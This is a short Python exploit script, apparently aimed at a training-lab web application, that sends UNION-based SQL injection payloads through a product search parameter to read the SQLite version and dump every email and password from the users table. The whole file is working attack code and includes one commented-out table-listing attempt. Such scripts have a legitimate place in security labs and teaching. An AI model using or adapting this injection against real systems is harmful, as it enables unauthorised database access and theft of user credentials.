#!/usr/bin/env python3
import requests
import json

url = "http://10.10.86.91/rest/product/search?q="

def req(url, param, inj):
	r = requests.get(url+param+inj+"--")
	return json.dumps(r.json(), sort_keys=True, indent=4)

# sqlite version
# select sqlite_version();
print("--- VERSION ---")
param = "oops')) union select 1,2,3,4,5,6,7,"
print(req(url, param, "sqlite_version()"))

# list tables
# SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
# DOES NOT WORK :(
#print("--- LIST TABLES ---")
#param = "oops')) union select 1,2,3,4,5,6,7,"
#print(req(url, param, "tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%%'"))


# dump users table
print("--- DUMP USER ---")
param = "oops')) union select 1,2,3,4,5,6,"
print(req(url, param, "email, password from users"))


